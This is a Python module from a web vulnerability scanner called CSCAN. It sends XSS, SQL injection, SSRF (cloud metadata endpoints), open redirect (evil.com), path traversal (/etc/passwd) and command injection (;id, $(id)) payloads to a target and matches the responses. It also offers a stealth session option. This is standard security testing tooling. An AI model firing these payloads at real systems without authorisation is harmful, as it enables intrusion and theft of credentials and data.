#!/usr/bin/env python3
"""
CSCAN — Active Web Vulnerability Tester
Tests for: XSS, SQLi (error + time-based), SSRF, Open Redirect,
           Path Traversal, Command Injection, IDOR hints.
"""

import re
import time
import random
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from modules.stealth import StealthSession
from modules.ui import (
    section, ok, warn, alert, info, critical, bold, divider,
    progress_bar, G, R, Y, C, M, W, BR, DM, RS
)

_stealth_session = None
_insecure_ssl    = False
TIMEOUT          = 8


def set_stealth_session(s: StealthSession):
    global _stealth_session
    _stealth_session = s


def set_insecure_ssl(flag: bool):
    global _insecure_ssl
    _insecure_ssl = flag


# ── HTTP helper ───────────────────────────────────────────────────────────────
def _get(url, params=None, timeout=TIMEOUT, allow_redirects=True):
    try:
        if _stealth_session:
            return _stealth_session.get(url, params=params, timeout=timeout,
                                        allow_redirects=allow_redirects)
        return requests.get(url, params=params, timeout=timeout,
                            verify=not _insecure_ssl, allow_redirects=allow_redirects,
                            headers={'User-Agent': 'Mozilla/5.0 (compatible; CSCAN/2.1)'})
    except Exception:
        return None


def _post(url, data=None, timeout=TIMEOUT):
    try:
        if _stealth_session:
            return _stealth_session.post(url, data=data, timeout=timeout)
        return requests.post(url, data=data, timeout=timeout,
                             verify=not _insecure_ssl,
                             headers={'User-Agent': 'Mozilla/5.0 (compatible; CSCAN/2.1)'})
    except Exception:
        return None


# ── Build base URL ────────────────────────────────────────────────────────────
def _build_url(target: str) -> str:
    if target.startswith(('http://', 'https://')):
        return target.rstrip('/')
    return f"http://{target.rstrip('/')}"


# ── XSS ──────────────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '"><iframe src="javascript:alert(1)">',
]

XSS_REFLECTION_PATTERNS = [
    re.compile(r'<script>alert\(1\)<\/script>', re.I),
    re.compile(r'onerror=alert\(1\)', re.I),
    re.compile(r'onload=alert\(1\)', re.I),
    re.compile(r'<svg\s+onload', re.I),
    re.compile(r'<iframe\s+src="javascript:', re.I),
]

TEST_PARAMS = ['q', 'search', 'id', 'name', 'query', 'keyword', 'input', 'term', 'page', 'url']


def _test_xss(base_url: str) -> list:
    findings = []
    for payload in XSS_PAYLOADS:
        for param in TEST_PARAMS:
            r = _get(base_url, params={param: payload})
            if r and r.text:
                for pat in XSS_REFLECTION_PATTERNS:
                    if pat.search(r.text):
                        findings.append({
                            'type': 'Reflected XSS',
                            'severity': 'HIGH',
                            'param': param,
                            'payload': payload,
                            'url': r.url,
                        })
                        return findings  # stop on first hit
    return findings


# ── SQL Injection ─────────────────────────────────────────────────────────────
SQLI_ERROR_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "1' AND SLEEP(0)--",
    "1; SELECT 1--",
]

SQLI_ERROR_PATTERNS = [
    re.compile(r"(sql syntax|mysql_fetch|ORA-\d{4,}|SQLSTATE|syntax error|unclosed quotation|"
               r"pg_query|unterminated string|quoted string not properly terminated)", re.I),
]

SQLI_TIME_PAYLOAD = "1' AND SLEEP(4)--"
SQLI_TIME_THRESHOLD = 3.5  # seconds


def _test_sqli(base_url: str) -> list:
    findings = []

    # Error-based
    for payload in SQLI_ERROR_PAYLOADS:
        for param in TEST_PARAMS[:5]:
            r = _get(base_url, params={param: payload})
            if r and r.text:
                for pat in SQLI_ERROR_PATTERNS:
                    if pat.search(r.text):
                        findings.append({
                            'type': 'SQL Injection (Error-Based)',
                            'severity': 'CRITICAL',
                            'param': param,
                            'payload': payload,
                            'url': r.url,
                            'evidence': pat.search(r.text).group(0),
                        })
                        return findings

    # Time-based (check just 'id' param — quick probe)
    try:
        start = time.time()
        r = _get(base_url, params={'id': SQLI_TIME_PAYLOAD}, timeout=10)
        elapsed = time.time() - start
        if elapsed >= SQLI_TIME_THRESHOLD:
            findings.append({
                'type': 'SQL Injection (Time-Based Blind)',
                'severity': 'CRITICAL',
                'param': 'id',
                'payload': SQLI_TIME_PAYLOAD,
                'url': base_url,
                'evidence': f'Response delayed {elapsed:.1f}s (threshold {SQLI_TIME_THRESHOLD}s)',
            })
    except Exception:
        pass

    return findings


# ── Open Redirect ─────────────────────────────────────────────────────────────
REDIRECT_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    '/\\evil.com',
    'https%3A%2F%2Fevil.com',
]
REDIRECT_PARAMS = ['next', 'redirect', 'url', 'return', 'goto', 'dest', 'destination', 'return_to', 'redir']


def _test_open_redirect(base_url: str) -> list:
    findings = []
    for param in REDIRECT_PARAMS:
        for payload in REDIRECT_PAYLOADS[:2]:
            r = _get(base_url, params={param: payload}, allow_redirects=False)
            if r and r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get('Location', '')
                if 'evil.com' in loc:
                    findings.append({
                        'type': 'Open Redirect',
                        'severity': 'MEDIUM',
                        'param': param,
                        'payload': payload,
                        'location': loc,
                        'url': r.url,
                    })
                    return findings
    return findings


# ── SSRF ──────────────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',   # AWS IMDS
    'http://metadata.google.internal/',            # GCP metadata
    'http://169.254.169.254/metadata/v1/',         # DigitalOcean
    'http://127.0.0.1/',
    'http://localhost/',
    'http://0.0.0.0/',
]
SSRF_PARAMS = ['url', 'src', 'fetch', 'load', 'path', 'img', 'file', 'data', 'proxy']
SSRF_EVIDENCE = re.compile(r'(ami-id|instance-id|account-id|computeMetadata|metadata\.google|127\.0\.0\.1|localhost)', re.I)


def _test_ssrf(base_url: str) -> list:
    findings = []
    for param in SSRF_PARAMS:
        for payload in SSRF_PAYLOADS[:3]:
            r = _get(base_url, params={param: payload}, timeout=6)
            if r and r.text and SSRF_EVIDENCE.search(r.text):
                findings.append({
                    'type': 'Server-Side Request Forgery (SSRF)',
                    'severity': 'CRITICAL',
                    'param': param,
                    'payload': payload,
                    'url': r.url,
                    'evidence': SSRF_EVIDENCE.search(r.text).group(0),
                })
                return findings
    return findings


# ── Path Traversal ────────────────────────────────────────────────────────────
PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\win.ini',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/etc/passwd',
]
PATH_EVIDENCE = re.compile(r'(root:x:0:0:|daemon:|bin:|nobody:|\\[extensions\\])', re.I)


def _test_path_traversal(base_url: str) -> list:
    findings = []
    for param in ['file', 'path', 'doc', 'page', 'template', 'include', 'view']:
        for payload in PATH_TRAVERSAL_PAYLOADS:
            r = _get(base_url, params={param: payload})
            if r and r.text and PATH_EVIDENCE.search(r.text):
                findings.append({
                    'type': 'Path Traversal (LFI)',
                    'severity': 'CRITICAL',
                    'param': param,
                    'payload': payload,
                    'url': r.url,
                    'evidence': PATH_EVIDENCE.search(r.text).group(0),
                })
                return findings
    return findings


# ── Command Injection ─────────────────────────────────────────────────────────
CMD_PAYLOADS = [
    ';id',
    '|id',
    '`id`',
    '$(id)',
    '; whoami',
    '| whoami',
]
CMD_EVIDENCE = re.compile(r'(uid=\d+\(|root\:|daemon\:|www-data\:|nobody\:)', re.I)


def _test_cmdi(base_url: str) -> list:
    findings = []
    for param in ['cmd', 'exec', 'command', 'run', 'ping', 'host', 'ip']:
        for payload in CMD_PAYLOADS:
            r = _get(base_url, params={param: payload})
            if r and r.text and CMD_EVIDENCE.search(r.text):
                findings.append({
                    'type': 'Command Injection (RCE)',
                    'severity': 'CRITICAL',
                    'param': param,
                    'payload': payload,
                    'url': r.url,
                    'evidence': CMD_EVIDENCE.search(r.text).group(0),
                })
                return findings
    return findings


# ── IDOR Hint Detection ───────────────────────────────────────────────────────
def _test_idor_hint(base_url: str) -> list:
    """
    Check if incrementing numeric IDs in the URL changes the response —
    a strong indicator of potential IDOR. Not a full exploit, just a hint.
    """
    findings = []
    r1 = _get(base_url, params={'id': '1'})
    r2 = _get(base_url, params={'id': '2'})
    if r1 and r2 and r1.status_code == 200 and r2.status_code == 200:
        if r1.text != r2.text and len(r1.text) > 100 and len(r2.text) > 100:
            findings.append({
                'type': 'Potential IDOR',
                'severity': 'MEDIUM',
                'param': 'id',
                'url': base_url,
                'evidence': f'?id=1 ({len(r1.text)}B) vs ?id=2 ({len(r2.text)}B) — different content',
            })
    return findings


# ── Main Entry Point ──────────────────────────────────────────────────────────
def active_vuln_scan(target: str, use_ssl: bool = False) -> dict:
    section("ACTIVE WEB VULNERABILITY SCANNER")
    base = _build_url(target)
    if use_ssl and base.startswith('http://'):
        base = 'https://' + base[7:]

    info(f"Target        : {BR}{W}{base}{RS}")
    warn("Active mode — payloads will be sent to the target.")
    warn("Only use on systems you own or have written permission to test.\n")

    test_suite = [
        ('XSS (Reflected)',        _test_xss),
        ('SQL Injection',          _test_sqli),
        ('Open Redirect',          _test_open_redirect),
        ('SSRF',                   _test_ssrf),
        ('Path Traversal / LFI',   _test_path_traversal),
        ('Command Injection',       _test_cmdi),
        ('IDOR Hint',              _test_idor_hint),
    ]

    all_findings = []
    for i, (name, fn) in enumerate(test_suite, 1):
        progress_bar(i, len(test_suite), name)
        try:
            hits = fn(base)
            all_findings.extend(hits)
        except Exception:
            pass

    print('\n')
    divider()

    if not all_findings:
        ok("No active vulnerabilities detected in this scan round.")
        info("Note: This scanner probes common parameter names. Custom params may still be vulnerable.")
    else:
        for f in all_findings:
            sev = f.get('severity', 'INFO')
            col = R if sev == 'CRITICAL' else (Y if sev in ('HIGH', 'MEDIUM') else C)
            print(f"  {BR}{col}[{sev}]{RS}  {BR}{W}{f['type']}{RS}")
            print(f"         {DM}Param   :{RS} {f.get('param', 'N/A')}")
            print(f"         {DM}Payload :{RS} {f.get('payload', 'N/A')[:60]}")
            if f.get('evidence'):
                print(f"         {DM}Evidence:{RS} {f['evidence'][:80]}")
            print(f"         {DM}URL     :{RS} {f.get('url', base)[:80]}")
            print()

        crits = [f for f in all_findings if f.get('severity') == 'CRITICAL']
        highs = [f for f in all_findings if f.get('severity') == 'HIGH']
        if crits:
            critical(f"{len(crits)} CRITICAL vulnerability(ies) confirmed! Immediate remediation required.")
        if highs:
            alert(f"{len(highs)} HIGH severity finding(s) — review promptly.")

    return {'findings': all_findings, 'total': len(all_findings)}
